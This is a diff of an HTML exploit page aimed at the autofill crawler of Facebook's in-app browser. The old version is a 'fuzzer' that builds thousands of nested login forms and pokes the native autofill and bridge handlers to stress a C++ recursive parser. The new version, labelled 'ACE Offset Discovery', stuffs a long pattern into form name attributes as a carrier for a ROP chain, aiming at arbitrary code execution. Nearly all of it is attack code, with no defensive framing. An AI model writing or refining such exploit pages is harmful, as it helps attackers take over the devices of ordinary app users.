@@ -1,71 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Native Crawler Fuzzer</title>
-</head>
-<body style="background:#000; color:#ff0; font-family:monospace;">
-    <h3>Deploying DOM Fractal...</h3>
-    <div id="log">Building deep structure...</div>
-    
+<body>
+    <h3>ACE Offset Discovery...</h3>
     <div id="root"></div>
-
     <script>
-        const logEl = document.getElementById('log');
-
-        function buildFractal() {
-            let currentElement = document.getElementById('root');
-            
-            // Create 5,000 deeply nested forms. 
-            // This is visually nothing, but structurally a nightmare for a C++ recursive function.
-            for (let i = 0; i < 5000; i++) {
-                let form = document.createElement('form');
-                form.id = "f" + i;
-                
-                let input1 = document.createElement('input');
-                input1.type = "text";
-                input1.name = "username_" + i;
-                input1.autocomplete = "username";
-                
-                let input2 = document.createElement('input');
-                input2.type = "password";
-                input2.name = "password_" + i;
-                input2.autocomplete = "current-password";
-
-                form.appendChild(input1);
-                form.appendChild(input2);
-                
-                // NEST the form inside the previous form
-                currentElement.appendChild(form);
-                currentElement = form;
+        function buildPattern(length) {
+            let p = "";
+            let chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            for (let i = 0; i < length; i++) {
+                p += chars.charAt(Math.floor(Math.random() * chars.length));
             }
-
-            logEl.innerText = "[*] Fractal built. Waking up FB Autofill engine...";
-
-            // Trigger Facebook's native crawler to scan the page
-            setTimeout(() => {
-                // Focus an input deep in the tree to force the IME and Autofill to evaluate the DOM
-                let deepInput = document.getElementsByName('password_4990')[0];
-                if(deepInput) deepInput.focus();
-
-                // Manually ping the Autofill Handler if it exists
-                if (window._AutofillMessageHandler) {
-                    try {
-                        window._AutofillMessageHandler.postMessage('{"action":"request_autofill"}');
-                    } catch(e) {}
-                }
-                
-                // Ping the unified bridge to force a layout recalculation
-                if (window.__call_iabjs_unified_bridge) {
-                    try {
-                        window.__call_iabjs_unified_bridge("page_language", "90dd8846-f47b-4312-8307-3681dc5bec88", "{}");
-                    } catch(e) {}
-                }
-            }, 1000);
+            return p;
         }
 
-        // Run the builder
-        setTimeout(buildFractal, 500);
+        const root = document.getElementById('root');
+        const pattern = buildPattern(1024); // Smaller, targeted buffer
+
+        function trigger() {
+            let current = root;
+            // We use the 'name' attribute as our carrier for the ROP chain
+            for (let i = 0; i < 2000; i++) {
+                let f = document.createElement('form');
+                let tag = buildPattern(8); // Unique string for every level
+                f.setAttribute('name', 'TAG_' + i + '_' + pattern); 
+                current.appendChild(f);
+                current = f;
+            }
+            
+            // Trigger the C++ crawler
+            if (window._AutofillMessageHandler) {
+                window._AutofillMessageHandler.postMessage('{"action":"request_autofill"}');
+            }
+        }
+        setTimeout(trigger, 1000);
     </script>
 </body>
 </html>
